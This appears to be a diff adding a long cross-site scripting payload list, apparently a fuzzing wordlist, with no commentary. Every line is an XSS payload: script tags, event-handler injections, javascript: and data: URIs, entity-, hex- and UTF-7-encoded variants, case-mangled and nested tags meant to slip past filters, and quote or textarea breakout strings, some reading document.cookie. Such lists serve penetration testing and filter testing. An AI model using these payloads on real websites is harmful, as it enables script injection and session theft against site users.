+"></textarea>"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="<textarea rows=1 cols=1><input value="
+"></textarea><<sCRip<script>T>alert("XSS");//<</sCRip<script>T><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS')"<textarea rows=1 cols=1><input value="
+"></textarea>\";alert('XSS');//<textarea rows=1 cols=1><input value="
+"></textarea></TITLE><sCRip<script>T>alert("XSS");</sCRip<script>T><TITLE><textarea rows=1 cols=1><input value="
+"></textarea><INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG DYNSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><IMG LOWSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br><textarea rows=1 cols=1><input value="
+"></textarea><BGSOUND SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BR SIZE="&{alert('XSS')}"><textarea rows=1 cols=1><input value="
+"></textarea><IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="xss:expression(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="behavior: url(xss.htc);"><textarea rows=1 cols=1><input value="
+"></textarea>¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><TABLE BACKGROUND="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><textarea rows=1 cols=1><input value="
+"></textarea> <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRip<script>T>alert('XSS')</sCRip<script>T>"><textarea rows=1 cols=1><input value="
+"></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value="<input onfocus="eval(prompt(1))" autofocus>XSS</input>
+<input onfocus=<svg poster="XSS" onmouseover="eval(atob(alert(1)))">autofocus>
+<input onblur=write(1) autofocus><input autofocus>
+<input onfocus="prompt(1)">
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<input onfocus=write(1) autofocus> 
+<script>alert(1)</script>
+</script><img src=x onerror=alert(1);>
+</script><iframe/onload=alert(1)>
+<img src=x onerror=alert(1);>
+<style ONLOAD=prompt(1)>
+<iframe/onload=alert(1)>
+<svg/onload=prompt(1)>
+<svg onload=alert(1)>
+data:text/plain,alert('xwx')
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==					 
+<video/poster/onerror=alert(1)>
+<video><source onerror="javascript:alert(1)">
+<video onerror="javascript:alert(1)"><source>
+<audio onerror="javascript:alert(1)"><source>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<keygen autofocus onfocus=alert(1)>
+<form><button formaction="javascript:alert(1)">	
+"style=background:black; onmouseover=alert(1)"
+"autofocus/onfocus="alert(1)
+"onmouseover="alert(1);"
+"/onmouseover= alert(1)>
+"onload="alert(1)""
+<input onblur=write(1) autofocus><input autofocus>
+"autofocus/onfocus="alert &#40/1&#41
+onfocus=onfocus=\u0061lert(1) autofocus
+autofocus onfocus=window.onerror=alert;throw/1/;//
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>	
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<h1 onmouseover=alert&lpar;1&rpar;>xwx
+<h1/onmouseover='\u0061lert(1)'>xwx
+<marquee/onstart=alert(1)>xwx
+<div/onmouseover='alert(1)'>xwx
+<h1/onmouseover='alert(1)'>xwx
+<h1 onmouseover='alert(1)'>xwx
+<p onmouseover='alert(1)'>xwx
+<p/onmouseover='alert(1)'>xwx
+<plaintext/onmouseover=prompt(1)> 
+<video poster=javascript:alert(1)//></video>
+<svg><x><script>alert&#40;1&#41</x>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<svg onload=window.onerror=alert;throw/1/;//"/>
+<img src=x onerror=while(true){prompt(1)}>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<svg id=javascript:alert(1) onload=location=id>
+<svg id=alert(1) onload=eval(id)>
+<img src=x:alert(alt) onerror=eval(src) alt=xwx>
+<body/onpageshow=(alert)(1)>
+<svg id=alert(1) onload=eval(id)>
+<svg onload=(alert)(1) >
+<frameset onload=alert(1)>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<video><source onerror="javascript:alert(1)">
+<form id=test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>X</button>
+<video onerror="javascript:alert(1)"><source></source></video> 
+alert( String(/XSS[s]/).substr(1,4) );
+(sessionStorage[!-1]=alert)(!-1)
+<script>alert( String(/XSS[s]/).substr(1,4) );(sessionStorage[!-1]=alert)(!-1)</script> 
+<form><button formaction="javascript:alert(1)">X</button> 
+<body oninput=alert(1)><input autofocus>
+<video poster="#" onmouseover="prompt(1)">
+<math href="javascript:alert(1)">CLICKME</math> <math> <maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction> </math>
+"><img src=x "onmouseover"=prompt(1);>
+"><sCRipT>alert(123);</sCRipT><input value="
+" onmouseover="prompt(1)"/ 
+<svg/onload=';alert(document.domain);'>
+<sCRipT>alert('XSS');</sCRipT>
+<sCRipT>alert(123);</sCRipT>
+</script><svg onload="alert(/x/)"><script>
+"><sCRipT>alert('XSS');</sCRipT>
+"><sCRipT>alert(123);</sCRipT>
+<style TYPE="text/javascript">alert('hello');</style>
+"><sCRipT>alert('XSS');</sCRipT><input value="
+</textarea><sCRipT>alert('XSS');</sCRipT><textarea rows=1 cols=1>
+</textarea><sCRipT>alert(123);</sCRipT><textarea rows=1 cols=1>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRipT>">'><sCRipT>alert(String.fromCharCode(88,83,83))</sCRipT>
+(onclick="alert(’XSSRes’))
+"><img src=x onerror=alert(document.cookie)>
+"/>0\"autofocus/onfocus=alert(/XSSPO SED/)--><video/poster/onerror=prompt(/XSSPOSED/)>"-confirm(/XSSPOSED/)-"
+onclick="alert(’XSSRes’)
+<input onfocus="prompt(1337)"> 
+<img src="javascript:alert('hello');">
+<img src="java&#010;script:alert('hello');">
+<img src="java&#X0A;script:alert('hello');">
+<IMG SRC="javasCRipT:alert('XSS');">
+" +onmouseover%3d'alert(%22xss%22)%3b''=""
+</script><script>alert('XSSTARXESED')</script>
+<IMG SRC=javasCRipT:alert('XSS')>
+<IMG SRC=JaVasCRipT:alert('XSS')>
+<IMG SRC=javasCRipT:alert("XSS")>
+'">><marquee><h1>XSS</h1></marquee>
+" onmouseover="alert(123);" xss="
+</sCRipT>">'><sCRipT>prompt(1);</sCRipT>
+</title><sCRipT>prompt(1);</sCRipT>
+</script><script>prompt(1)</script>
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="javasCRipT:alert('XSS');">
+<IMG SRC="jav&#x09;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0A;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0D;asCRipT:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javasCRipT:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="
+<<sCRipT>alert("XSS");//<</sCRipT>
+<img src='zzzz' onerror='alert(1)' />
+<IMG SRC="javasCRipT:alert('XSS')"
+\";alert('XSS');//
+\\x3c\\x2f\\x74\\x69\\x74\\x6c\\x65\\x3e\\x3c\\x73\\x63\\x72\\x69\\x70\\x74\\x3e\\x61\\x6c\\x65\\x72\\x74\\x28\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x2e\\x64\\x6f\\x6d\\x61\\x69\\x6e\\x29\\x3c\\x2f\\x73\\x63\\x72\\x69\\x70\\x74\\x3e
+</TITLE><sCRipT>alert("XSS");</sCRipT><TITLE>
+<INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');">
+<IMG DYNSRC="javasCRipT:alert('XSS')">
+<IMG LOWSRC="javasCRipT:alert('XSS')">
+<STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<BGSOUND SRC="javasCRipT:alert('XSS');">
+<LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE>
+<XSS STYLE="behavior: url(xss.htc);">
+¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');">
+<IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<TABLE BACKGROUND="javasCRipT:alert('XSS')">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRipT>alert('XSS')</sCRipT>">
+<sCRipT =">" >alert(123);</sCRipT>
+"></textarea>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRipT>">'><sCRipT>alert(String.fromCharCode(88,83,83))</sCRipT><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=JaVasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>" onmouseover="alert(123);" xss="<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav	asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x09;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0A;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0D;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea>perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=" &#14;  javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="<textarea rows=1 cols=1><input value="
+"></textarea><<sCRipT>alert("XSS");//<</sCRipT><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS')"<textarea rows=1 cols=1><input value="
+"></textarea>\";alert('XSS');//<textarea rows=1 cols=1><input value="
+"></textarea></TITLE><sCRipT>alert("XSS");</sCRipT><TITLE><textarea rows=1 cols=1><input value="
+"></textarea><INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG DYNSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><IMG LOWSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br><textarea rows=1 cols=1><input value="
+"></textarea><BGSOUND SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BR SIZE="&{alert('XSS')}"><textarea rows=1 cols=1><input value="
+"></textarea><IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="xss:expression(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="behavior: url(xss.htc);"><textarea rows=1 cols=1><input value="
+"></textarea>¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><TABLE BACKGROUND="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><textarea rows=1 cols=1><input value="
+"></textarea> <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRipT>alert('XSS')</sCRipT>"><textarea rows=1 cols=1><input value="
+"></textarea><sCRipT =">" >alert(123);</sCRipT><textarea rows=1 cols=1><input value="
+<sCRip<script>T>alert('XSS');</sCRip<script>T>
+<sCRip<script>T>alert(123);</sCRip<script>T>
+"><sCRip<script>T>alert('XSS');</sCRip<script>T>
+"><sCRip<script>T>alert(123);</sCRip<script>T>
+"><sCRip<script>T>alert('XSS');</sCRip<script>T><input value="
+"><sCRip<script>T>alert(123);</sCRip<script>T><input value="
+</textarea><sCRip<script>T>alert('XSS');</sCRip<script>T><textarea rows=1 cols=1>
+</textarea><sCRip<script>T>alert(123);</sCRip<script>T><textarea rows=1 cols=1>
+';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRip<script>T>">'><sCRip<script>T>alert(String.fromCharCode(88,83,83))</sCRip<script>T>
+<IMG SRC="javasCRipT:alert('XSS');">
+<IMG SRC=javasCRipT:alert('XSS')>
+<IMG SRC=JaVasCRipT:alert('XSS')>
+<IMG SRC=javasCRipT:alert("XSS")>
+" onmouseover="alert(123);" xss="
+<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav	asCRipT:alert('XSS');">
+<IMG SRC="jav&#x09;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0A;asCRipT:alert('XSS');">
+<IMG SRC="jav&#x0D;asCRipT:alert('XSS');">
+perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out
+<IMG SRC=" &#14;  javasCRipT:alert('XSS');">
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="
+<<sCRip<script>T>alert("XSS");//<</sCRip<script>T>
+<IMG SRC="javasCRipT:alert('XSS')"
+\";alert('XSS');//
+</TITLE><sCRip<script>T>alert("XSS");</sCRip<script>T><TITLE>
+<INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');">
+<IMG DYNSRC="javasCRipT:alert('XSS')">
+<IMG LOWSRC="javasCRipT:alert('XSS')">
+<STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br>
+<BGSOUND SRC="javasCRipT:alert('XSS');">
+<LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');">
+<BR SIZE="&{alert('XSS')}">
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE>
+<XSS STYLE="behavior: url(xss.htc);">
+¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾
+<META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');">
+<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">
+<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');">
+<IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME>
+<IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME>
+<TABLE BACKGROUND="javasCRipT:alert('XSS')">
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+ <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-
+<META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRip<script>T>alert('XSS')</sCRip<script>T>">
+<sCRipT =">" >alert(123);</sCRip<script>T>
+"></textarea>';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></sCRip<script>T>">'><sCRip<script>T>alert(String.fromCharCode(88,83,83))</sCRip<script>T><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=JaVasCRipT:alert('XSS')><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=javasCRipT:alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>" onmouseover="alert(123);" xss="<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav	asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x09;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0A;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="jav&#x0D;asCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea>perl -e 'print "<IMG SRC=java\0sCRipT:alert(\"XSS\")>";' > out<textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC=" &#14;  javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><textarea rows=1 cols=1><input value="
+"></textarea>"><BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")><input value="<textarea rows=1 cols=1><input value="
+"></textarea><<sCRip<script>T>alert("XSS");//<</sCRip<script>T><textarea rows=1 cols=1><input value="
+"></textarea><IMG SRC="javasCRipT:alert('XSS')"<textarea rows=1 cols=1><input value="
+"></textarea>\";alert('XSS');//<textarea rows=1 cols=1><input value="
+"></textarea></TITLE><sCRip<script>T>alert("XSS");</sCRip<script>T><TITLE><textarea rows=1 cols=1><input value="
+"></textarea><INPUT TYPE="IMAGE" SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IMG DYNSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><IMG LOWSRC="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE>li {list-style-image: url("javasCRipT:alert('XSS')");}</STYLE><UL><LI>XSS</br><textarea rows=1 cols=1><input value="
+"></textarea><BGSOUND SRC="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><LINK REL="stylesheet" HREF="javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><BR SIZE="&{alert('XSS')}"><textarea rows=1 cols=1><input value="
+"></textarea><IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="xss:expression(alert('XSS'))"><textarea rows=1 cols=1><input value="
+"></textarea><STYLE type="text/css">BODY{background:url("javasCRipT:alert('XSS')")}</STYLE><textarea rows=1 cols=1><input value="
+"></textarea><XSS STYLE="behavior: url(xss.htc);"><textarea rows=1 cols=1><input value="
+"></textarea>¼sCRipT¾alert(¢XSS¢)¼/sCRipT¾<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"><textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javasCRipT:alert('XSS');"><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC="javasCRipT:alert('XSS');"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><IFRAME SRC=# onmouseover="alert(document.cookie)"></IFRAME><textarea rows=1 cols=1><input value="
+"></textarea><TABLE BACKGROUND="javasCRipT:alert('XSS')"><textarea rows=1 cols=1><input value="
+"></textarea><DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029"><textarea rows=1 cols=1><input value="
+"></textarea> <HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-sCRipT+AD4-alert('XSS');+ADw-/sCRipT+AD4-<textarea rows=1 cols=1><input value="
+"></textarea><META HTTP-EQUIV="Set-Cookie" Content="USERID=<sCRip<script>T>alert('XSS')</sCRip<script>T>"><textarea rows=1 cols=1><input value="
+"></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value=""></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value=""></textarea><sCRipT =">" >alert(123);</sCRip<script>T><textarea rows=1 cols=1><input value="
